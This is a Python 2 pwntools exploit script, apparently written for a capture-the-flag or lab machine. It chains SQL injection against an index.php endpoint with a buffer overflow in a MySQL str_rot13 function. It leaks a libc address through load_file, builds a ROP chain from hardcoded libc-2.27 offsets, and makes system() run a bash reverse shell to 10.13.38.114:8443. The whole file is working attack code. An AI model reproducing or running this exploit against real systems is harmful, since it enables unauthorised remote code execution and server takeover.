#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import requests

from base64 import b64encode
from pwn import *

context(arch='amd64', os='linux')
context.log_level = "debug" if "debug" in sys.argv else "info"

HOST=sys.argv[1]
PORT=sys.argv[2]


def rop(*args):
    return "".join([p64(x) for x in args])


def send_payload(data):
    print(hexdump(data))
    encoded_payload = b64encode(data)
    payload = {
        "id": "1 UNION SELECT null,null,null,str_rot13(FROM_BASE64('{}'))-- -".format(encoded_payload)
    }
    print("\n[*] HTTP POST DATA: \n[*] {}\n".format(payload))
    r = requests.post("http://{}:{}/index.php".format(HOST, PORT), data=payload)
    print("[*] REQUEST STATUS: {}".format(r.status_code))


def libc_leak():
    requests.get("""http://{0}:{1}/index.php?id=1 UNION SELECT null,null,null,str_rot13("{2}")-- -""".format(HOST, PORT, "L"*(1024+16))).content
    data = requests.get("""http://{}:{}/index.php?id=1 UNION SELECT null,null,null,load_file("/var/lib/mysql/logfile.log")-- -""".format(HOST,PORT).format(HOST,PORT)).content
    leak = data[:-55][-6:]
    addr = int(leak[::-1].encode('hex'), 16)
    print("[*] Hexdump Leak:\n{}".format(hexdump(leak)))
    print("[*] Leaked value: {0} -> 0x{0:x}".format(addr))
    return addr


def write_to_buff(data, buff_addr, chunk=16):
    payload = ""
    if len(data) % 2 != 0:
        rev_input = data[::-1].replace(' ', '  ', 1)
    else:
        rev_input = data[::-1]
    rev_input_hex = rev_input.encode('hex')

    payload += rop(
        pop_rax,
        buff_addr,
    )
    for item in map( "".join, zip(*[iter(rev_input_hex)]*int(chunk))[::-1]):
        payload += rop(
            pop_rdi, int(str("0x"+item), 16),
            mov_rax_rdi,
            pop_rdi, 0x8,
            add_rax_rdi,
        )
    return payload


"""
0x000000000002155f : pop rdi ; ret
0x00000000000439c8 : pop rax ; ret
0x0000000000001b96 : pop rdx ; ret
0x0000000000023e6a : pop rsi ; ret
0x000000000003eb0b : pop rcx ; ret
0x000000000002cb49 : pop rbx ; ret
0x0000000000097055 : mov qword ptr [rax], rdi ; ret
0x00000000000301a4 : mov qword ptr [rax], rdx ; ret
0x00000000000d060f : add rax, rdi; ret
0x00000000000008aa : ret
"""

leak_addr = libc_leak()
cmd = """bash -c 'bash -i>&/dev/tcp/10.13.38.114/8443 0>&1'\0"""

#### libc offsets (libc-2.27.so)
####
libc_addr    = leak_addr - 0x64dc0    # libc base address
pop_rax      = libc_addr + 0x439c8    # pop rax; ret
pop_rdi      = libc_addr + 0x2155f    # pop rdi ; ret
mov_rax_rdi  = libc_addr + 0x97055    # mov qword ptr [rax], rdi ; ret
add_rax_rdi  = libc_addr + 0xd060f    # add rax, rdi; ret
ret          = libc_addr + 0x08aa     # ret
cmd_buff     = libc_addr + 0x3ed010   # libc@data rw
system       = libc_addr + 0x4f440    # libc@system

### exploit code
###
payload = "B"*(1024+8+8)
payload += write_to_buff(cmd, cmd_buff)
payload += rop(
    pop_rdi,
    cmd_buff,
    ret,
    system,
)

print("[*] ")
print("[*] libc base address   0x{:x}".format(libc_addr))
print("[*] libc system address 0x{:x}".format(system))
print("[*] cmd buffer address  0x{:x}".format(cmd_buff))
print("[*] ")

print("########## Payload length: {} ##########").format(len(payload))
send_payload(payload)

